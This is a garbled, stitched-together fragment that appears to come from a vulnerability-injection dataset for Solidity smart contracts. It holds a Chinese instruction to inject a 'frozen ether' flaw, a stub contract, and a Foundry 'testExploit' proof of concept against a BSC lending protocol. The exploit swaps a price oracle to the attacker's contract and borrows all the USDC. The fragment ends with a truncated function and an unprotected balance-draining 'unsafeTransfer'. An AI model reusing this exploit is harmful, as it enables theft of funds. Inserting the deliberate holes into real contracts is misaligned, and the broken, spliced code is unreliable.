
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity >=0.7.0 <0.9.0;

Please inject the following vulnerabilities into the given Solidity contract:;
冻结以太漏洞：冻结以太漏洞指合约资金被发送到没有fallback函数的合约，导致资金无法转移或冻结。在数据交易中，攻击者可能通过发送资金到锁定合约，导致交易中涉及的资金被冻结，无法完成支付或资金流转，影响交易的完成。;
Contract source code:;

;
;
contract ContractTest is DSTest {
  IERC20 usdc = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
  IRToken rbnb = IRToken(0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA);
  IRToken rusdc = IRToken(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5);
  ICointroller cointroller =;
    ICointroller(0x4f3e801Bd57dC3D641E72f2774280b21d31F64e4);
  ISimplePriceOracle simplePriceOracle =;
    ISimplePriceOracle(0xD55f01B4B51B7F48912cD8Ca3CDD8070A1a9DBa5);
  IPriceFeed chainlinkBNBUSDPriceFeed =;
    IPriceFeed(0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE);
  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
  function setUp() public {
    cheats.createSelectFork("bsc", 16956474)};
  function testExploit() public {
    emit log_named_uint("Before exploit, USDC balance of attacker:",
      usdc.balanceOf(address(this)));
    rbnb.approve(address(cointroller), type(uint256).max);
    address[] memory rTokens = new address[](1);
    rTokens[0] = address(rbnb);
    cointroller.enterMarkets(rTokens);
    rbnb.mint{ value: 100000000000000 }();
    simplePriceOracle.setOracleData(address(rbnb), address(this));
    rusdc.borrow(rusdc.getCash());
    rusdc.transfer(msg.sender, rusdc.balanceOf(address(this)));
    simplePriceOracle.setOracleData(address(rbnb),;
      address(chainlinkBNBUSDPriceFeed));
    emit log_named_uint("After exploit, USDC balance of attacker:",
      usdc.balanceOf(address(this)))};
  function decimals() external view returns (uint8) {
    return chainlinkBNBUSDPriceFeed.decimals();};
  function latestRound
function unsafeTransfer(address to) public {
    to.call{value: address(this).balance}("")}